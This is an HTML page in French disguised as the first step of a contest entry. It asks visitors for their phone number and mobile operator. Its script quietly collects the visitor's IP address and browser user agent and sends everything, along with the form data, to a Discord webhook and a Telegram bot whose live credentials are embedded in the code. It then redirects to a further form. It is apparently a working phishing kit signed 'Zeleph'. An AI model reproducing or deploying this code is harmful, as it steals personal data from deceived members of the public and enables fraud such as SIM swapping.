<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Concours - √âtape 1</title>
<style>
  body {
    background: #2c014d;
    color: #fff;
    font-family: sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .c {
    background: rgba(44,1,77,0.85);

  }
  input, select, button {
    width: 100%;

    padding: 12px;

    background: transparent;
    color: white;
    font-size: 16px;
    outline: none;
    box-shadow: inset 0 0 8px #9b00ff;
    transition: 0.3s;
  }
  input:focus, select:focus {
    border-color: #f7b500;
    box-shadow: 0 0 10px #f7b500;
  }
  button {
    background: #f7b500;
    color: #2c014d;
    font-weight: bold;
    cursor: pointer;
    box-shadow: 0 0 10px #f7b500;
    transition: 0.3s;
  }
  button:hover {

    margin-top: 15px;
  }
</style>
</head>
<body>
<div class="c">
  <h1>√âtape 1 : Votre num√©ro</h1>
  <form id="form1">
    <select name="operateur" required>
      <option value="" disabled selected>Choisissez votre op√©rateur</option>
      <option value="Orange">Orange</option>
      <option value="SFR">SFR</option>
      <option value="Free">Free</option>
      <option value="Bouygues">Bouygues</option>
    </select>
    <input name="telephone" type="tel" placeholder="Num√©ro de t√©l√©phone" pattern="[0-9]{10}" required>
    <button type="submit">Continuer</button>
  </form>
  <div id="msg"></div>
</div>

<script>
  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";
  const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
  const TELEGRAM_CHAT_ID = "-1002810249796";

  async function getIP() {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      return data.ip || "IP inconnue";
    } catch {
      return "IP inconnue";
    }
  }

  async function sendDiscord(embed) {
    return fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  }

  async function sendTelegram(text) {
    return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
  }

  document.getElementById('form1').addEventListener('submit', async e => {
    e.preventDefault();
    document.getElementById('msg').textContent = "Envoi en cours...";
    const formData = new FormData(e.target);
    const operateur = formData.get('operateur');
    const telephone = formData.get('telephone');
    const ip = await getIP();
    const ua = navigator.userAgent || "Inconnu";

    // Envoi du message (IP + UA + op√©rateur + t√©l√©phone)
    const discordEmbed = {
      title: "üåê LOGIN by Zeleph [üåê]",
      color: 0x9B00FF,
      fields: [
        { name: "üåê Adresse IP", value: ip, inline: false },
        { name: "üåê User-Agent", value: ua, inline: false },
        { name: "üöÄ Op√©rateur T√©l√©phonique", value: operateur, inline: true },
        { name: "üöÄ T√©l√©phone", value: telephone, inline: true }
      ],
      timestamp: new Date().toISOString()
    };

    const telegramText =
      `[üåê] LOGIN by Zeleph [üåê]\n\n` +
      `üåê Adresse IP : ${ip}\n` +
      `üåê User-Agent : ${ua}\n\n` +
      `üöÄ Op√©rateur T√©l√©phonique : ${operateur}\n` +
      `üöÄ T√©l√©phone : ${telephone}`;

    await Promise.all([sendDiscord(discordEmbed), sendTelegram(telegramText)]);

    // Sauvegarde localStorage pour √©tape 2
    localStorage.setItem('step1', JSON.stringify({ operateur, telephone, ip, ua }));

    document.getElementById('msg').textContent = "Envoy√© ! Redirection...";
    setTimeout(() => window.location = 'formulaire.html', 1000);
  });
</script>
</body>
</html>
